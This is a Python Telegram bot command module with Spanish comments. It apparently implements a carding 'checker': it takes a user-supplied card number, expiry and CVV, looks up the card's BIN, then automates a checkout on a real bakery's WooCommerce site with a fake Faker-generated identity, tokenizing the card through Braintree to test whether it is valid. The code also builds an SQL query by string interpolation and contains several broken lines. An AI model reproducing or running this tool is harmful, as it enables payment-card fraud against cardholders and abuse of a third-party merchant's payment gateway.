import json
import requests
import time
import asyncio
import re
import base64
import random
from faker import Faker
import os
import colored 
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
from user import*
from values import *

# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["ac"], ["/", "."]))
async def ch(_, message: Message):


            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
<i>⊗ Comando</i><i>/bg</i>
<i>⊗ Formato:</i> <code>cc|mm|yy|cvv</code>
<i>⊗ Gateway:</i><code>Bogota</code>""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
            
            # Continuar con el resto del código si el bin no está en la lista de bins prohibidos
            # ...

   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

    # ... (el resto del código existente)
    # ... (el resto del código existente)

                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| Bogota
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")
            
            
            
            def find_between( data, first, last ):
              try:
                start = data.index( first ) + len( first )
                end = data.index( last, start )
                return data[start:end]
              except ValueError:
                return None
            fake = Faker()
            p_nombre = fake.first_name()
            s_nombre = fake.last_name()
            Ncor = str(random.randint(111, 9999))
            Nlast4 = str(random.randint(1000, 9999))
            mail = (p_nombre+s_nombre+Ncor+'@gmail.com').lower()
            
            #############
            headers = {
              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
              #"content-type": "multipart/form-data; boundary=----WebKitFormBoundarybRdSFAAeBN90Y11G",
              "origin": "https://healthyjoybakes.com",
              "referer": "https://healthyjoybakes.com/?product=omega-power-bread",
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
              
            }
            data = {
              'quantity': '1',
              'add-to-cart': '18'
              
            }
            r1 = requests.post('https://healthyjoybakes.com/?product=omega-power-bread', headers=headers, data=data)
            #print(r1.text)
            
            headers = {
              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
              "referer": "https://healthyjoybakes.com/?page_id=15",
              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
		  
             
            }
            r2 = requests.get('https://healthyjoybakes.com/?page_id=16', headers=headers)
            print(r2.text)
            noncecc = find_between(r2.text, 'credit_card","client_token_nonce":"', '"')
            'db63a6892b'
            print(noncecc)
            
            nonce_proc = find_between(r2.text, '"woocommerce-process-checkout-nonce" value="', '"')
            
            headers = {
              "accept": "*/*",
              "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
              "origin": "https://healthyjoybakes.com",
              "referer": "https://healthyjoybakes.com/?page_id=16",
              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
              "x-requested-with": "XMLHttpRequest",
              
            }
            data = {
              "action": "wc_braintree_credit_card_get_client_token",
              "nonce": noncecc,
              
            }
            r3 = requests.post('https://healthyjoybakes.com/wp-admin/admin-ajax.php', headers=headers, data=data)
            print(r3.text)
            
            embearer = r3.text.strip('"data":"').strip('"')
            decode = base64.decode(embearer)
            bearer = decode.strip('"authorizationFingerprint":"').strip('"')
         
            
            headers = {
              'Accept': '*/*',
              'Authorization': 'Bearer '+Bearer,
              'Braintree-Version': '2018-05-10',
              'Content-Type': 'application/json',
              'Host': 'payments.braintree-api.com',
              'Origin': 'https://assets.braintreegateway.com',
              'Referer': 'https://assets.braintreegateway.com/',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
              
            }
            data = {
              "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "b2d994a8-8985-4448-952a-fc4b86bacbda"
                
              },
              "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
              "variables": {
                "input": {
                  "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv
                    
                  },
                  "options": {
                    "validate": False
                    
                  }
                  
                }
                
              },
              "operationName": "TokenizeCreditCard"
              
            }
            r4 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=data)
            if 'tokenizeCreditCard' in r4.text:
              tokencc = r4.json()['data']['tokenizeCreditCard']['token']
              
              
            headers = {
              "accept": "application/json, text/javascript, */*; q=0.01",
              "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
              "origin": "https://healthyjoybakes.com",
              "referer": "https://healthyjoybakes.com/?page_id=16",
              "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",	"x-requested-with": "XMLHttpRequest",
              
            }
            data = {
              'billing_first_name': s_nombre,
        		  'billing_last_name': p_nombre,
        		  'billing_company': '',
        		  'billing_country': 'US',
        		  'billing_address_1': 'street90',
        		  'billing_address_2': '',
        		  'billing_city': 'new york',
        		  'billing_state': 'NY',
        		  'billing_postcode': '10080',
        		  'billing_phone': '305748'+Nlast4,
        		  'billing_email': mail,
        		  'account_password': '',
        		  'shipping_first_name': s_nombre,
        		  'shipping_last_name': p_nombre,
        		  'shipping_company': '',
        		  'shipping_country': 'MX',
        		  'shipping_address_1': '',
        		  'shipping_address_2': '',
        		  'shipping_city': '',
        		  'shipping_state': '',
        		  'shipping_postcode': '',
        		  'order_comments': '',
        		  'payment_method': 'braintree_credit_card',
        		  'wc-braintree-credit-card-card-type': 'visa',
        		  'wc-braintree-credit-card-3d-secure-enabled': '',
        		  'wc-braintree-credit-card-3d-secure-verified': '0',
        		  'wc-braintree-credit-card-3d-secure-order-total': '24.73',
        		  'wc_braintree_credit_card_payment_nonce': tokencc,
        		  'wc_braintree_device_data': '',
        		  'terms': 'on',
        		  'terms-field': '1',
        		  'woocommerce-process-checkout-nonce': nonce_proc,
        		  '_wp_http_referer': '/?wc-ajax=update_order_review'
              
            }
            
            r5 = requests.post('https://healthyjoybakes.com/?wc-ajax=checkout', headers=headers, data=data)
            print(r5.text)

